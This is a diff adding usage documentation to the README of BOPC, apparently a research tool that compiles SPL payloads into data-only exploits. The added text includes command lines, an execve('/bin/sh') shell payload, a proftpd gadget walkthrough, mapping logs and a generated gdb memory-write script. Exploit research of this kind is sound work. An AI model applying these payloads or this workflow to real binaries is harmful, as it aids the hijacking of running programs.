@@ -237,14 +237,198 @@ values are a nice trade off between accuracy and performance that I found during
 then evaluation.
 
 
-### An end to end example
+### Example
 
+Let's see now how to actually use BOPC. The first thing to do is to get the basic block
+abstractions. This step is optional, but I expect that you are going to run BOPC several times,
+so it's a good idea to get the abstractions first:
+```
+./source/BOPC.py -dd --binary $BINARY --abstractions saveonly
+```
+
+This calculates the abstractions and saves them into a  file named `$BINARY.abs`. Don't forget
+to enable debugging to see the status on the screen.
+
+
+Writing an SPL payload is pretty much like writing C:
+```C
+void payload() 
+{ 
+    string prog = "/bin/sh\0";
+    int argv    = {&prog, 0x0};
+
+    __r0 = &prog;
+    __r1 = &argv;
+    __r2 = 0;
+    
+    execve(__r0, __r1, __r2);
+}
+```
+
+
+Please take a look at the available [payloads](./payloads) to see all features of SPL.
+Don't expect to write crazy program with SPL; Yes, in theory you can write any program.
+In practice the more complicated is the SPL payload, the more the complexity increases
+and the harder it gets to find a solution.
+
+
+Running BOPC is as simple as the following:
+```
+./source/BOPC.py -dd --binary $BINARY --source $PAYLOAD --abstractions load \
+--entry $ENTRY --format gdb
+```
+
+If everything goes well an `*.gdb` file will be created that contains the set of memory writes
+to execute the desired payload.
+
+
+### Pruning search space
+
+A common problem is that there can be thousands of mappings (it's exponential based on the 
+number of registers and variables that are used). Each mapping can take up to a minute to test
+(assuming out of order execution and other optimizations), so BOPC may run for days.
+
+However, if you know approximately where a solution could be, you can ask BOPC to quickly find
+(and verify) it, without trying all mappings. Let's assume that you want to execute the following
+SPL payload:
+```C
+void payload() 
+{ 
+    string msg = "This is my random message! :)\0";
+
+    __r0 = 0;
+    __r1 = &msg;
+    __r2 = 32;
+
+    write( __r0, __r1, __r2 );
+}
+```
+
+Because we have a system call, we know the register mapping: 
+`__r0 <-> rdi, __r1 <-> rsi, __r2 <-> rdx`.
+
+Let's assume that we're on `proftpd` binary which contains the following "all-in-one"
+functional block:
+```Assembly
+.text:000000000041D0B5 loc_41D0B5:
+.text:000000000041D0B5        mov     edi, cs:scoreboard_fd ; fd
+.text:000000000041D0BB        mov     edx, 20h        ; n
+.text:000000000041D0C0        mov     esi, offset header ; buf
+.text:000000000041D0C5        call    _write
+```
+
+The abstractions for this basic block, will be the following (recall that to get the
+abstractions for a single basic block, you need to pass the `--abstract-blk 0x41D0B5`
+in the command line).
+```
+[22:02:07,822] [+] Abstractions for basic block 0x41d0b5:
+[22:02:07,823] [+]          regwr :
+[22:02:07,823] [+] 		rsp = {'writable': True, 'const': 576460752303359992L, 'type': 'concrete'}
+[22:02:07,823] [+] 		rdi = {'sym': {}, 'memrd': None, 'type': 'deref', 'addr': <BV64 0x66e9e0>, 'deps': []}
+[22:02:07,823] [+] 		rsi = {'writable': True, 'const': 6787008L, 'type': 'concrete'}
+[22:02:07,823] [+] 		rdx = {'writable': False, 'const': 32L, 'type': 'concrete'}
+[22:02:07,823] [+]          memrd : set([(<SAO <BV64 0x66e9e0>>, 32)])
+[22:02:07,823] [+]          memwr : set([(<SAO <BV64 0x7ffffffffff07f8>>, <SAO <BV64 0x41d0ca>>)])
+[22:02:07,823] [+]          conwr : set([(576460752303359992L, 64)])
+[22:02:07,823] [+]       splmemwr : []
+[22:02:07,823] [+]           call : {}
+[22:02:07,823] [+]           cond : {}
+[22:02:07,823] [+]        symvars : {}
+[22:02:07,823] [*] 
+```
+
+Here, `__r0 <-> rdi` is loaded indirectly and the value of `__r1 <-> rsi` (which holds the `msg` 
+variable) is `6787008` or `0x678fc0` in hex. Then we enumerate all possible mappings with the
+`--enum-mappings` option. Here, there are *287* possible mappinges, but there are instances that
+we have thousands of mappings:
+
+
+If we look at the output we can quickly search for the appropriate mapping, which in our case
+is mapping *#89*:
+```
+[.... TRUNCATED FOR BREVITY ....]
+[21:59:28,471] [*] Trying mapping #88:
+[21:59:28,471] [*] 	Registers: __r0 <-> rdi | __r1 <-> rsi | __r2 <-> rdx
+[21:59:28,471] [*] 	Variables: msg <-> *<BV64 0x7ffffffffff1440>
+[21:59:28,614] [*] Trying mapping #89:
+[21:59:28,614] [*] 	Registers: __r0 <-> rdi | __r1 <-> rsi | __r2 <-> rdx
+[21:59:28,614] [*] 	Variables: msg <-> 0x678fc0L
+[21:59:28,762] [*] Trying mapping #90:
+[21:59:28,762] [*] 	Registers: __r0 <-> rdi | __r1 <-> rsi | __r2 <-> rdx
+[21:59:28,762] [*] 	Variables: msg <-> *<BV64 r12_56287_64 + 0x28>
+[.... TRUNCATED FOR BREVITY ....]
+[22:00:04,709] [*] Trying mapping #287:
+[22:00:04,709] [*] 	Registers: __r0 <-> rdi | __r1 <-> rsi | __r2 <-> rdx
+[22:00:04,709] [*] 	Variables: msg <-> *<BV64 __add__(((0#32 .. rbx_294059_64[31:0]) << 0x5), r12_294068_64, 0x10)>
+[22:00:04,979] [+] Trace searching algorithm finished with exit code 0
+```
+
+Now that we know the actual mapping, we can tell BOPC to focus on this one. All we have to
+do is to pass the `--mapping-id 89` option.
+
+
+We run this and after 1 minute and 51 seconds later, we get the solution:
+```
+#
+# This file has been created by BOPC at: 29/03/2018 22:04
+# 
+# Solution #1
+# Mapping #89
+# Registers: __r0 <-> rdi | __r1 <-> rsi | __r2 <-> rdx
+# Variables: msg <-> 0x678fc0L
+# 
+# Simulated Trace: [(0, '41d0b5', '41d0b5'), (4, '41d0b5', '41d0b5'), (6, '41d0b5', '41d0b5'), (8, '41d0b5', '41d0b5'), (10, '41d0b5', '41d0b5')]
+# 
+
+break *0x403740
+break *0x41d0b5
+
+# Entry point
+set $pc = 0x41d0b5 
+
+# Allocation size is always bigger (it may not needed at all)
+set $pool = malloc(20480)
+
+# In case that rbp is not initialized
+set $rbp = $rsp + 0x800 
+
+# Stack and frame pointers aliases
+set $stack = $rsp 
+set $frame = $rbp 
+
+set {char[30]} (0x678fc0) = {0x54, 0x68, 0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 0x6d, 0x79, 0x20, 0x72, 0x61, 0x6e, 0x64, 0x6f, 0x6d, 0x20, 0x6d, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x21, 0x20, 0x3a, 0x29, 0x00}
+
+set {char[8]} (0x66e9e0) = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
+```
+
+
+##### Measuring application capabilities
+
+**NOTE:** This is a new concept, which is not mentioned in the paper. 
+
+Beyond finding Data-Only payloads, BOPC provides some basic capability measurements.
+Although it is not related to the Block Oriented Programming, it can provide upper
+bounds and strong "indications" on what types of payloads can be executed and what
+are not. This is very useful as we can quickly find types of payloads that **cannot**
+be executed in the target binary.  
+To get the all application capabilities run the following code:
+```
+./source/BOPC.py -dd --binary $BINARY --abstractions load --capability all save
 
 ```
-./source/BOPC.py -dd -b $BINARY -a saveonly
+
+If you want to simply dump all functional gadgets for a specific statement, you can do
+it as follows:
+```
+./source/BOPC.py -dd --binary $BINARY --abstractions load --capability $STMT noedge
+
 ```
 
-
+Where `$STMT` can be one ore more from `{all, regset, regmod, memrd, memwr, call, cond}`.
+The `noedge` option is to boost things up (essentially it does not calculate edges in the
+capability graph; Each node in the capability graph represents a functional block from
+the binary while and edge represents the context-sensitive shortest path distance
+between two functional blocks).
 
 
 ___
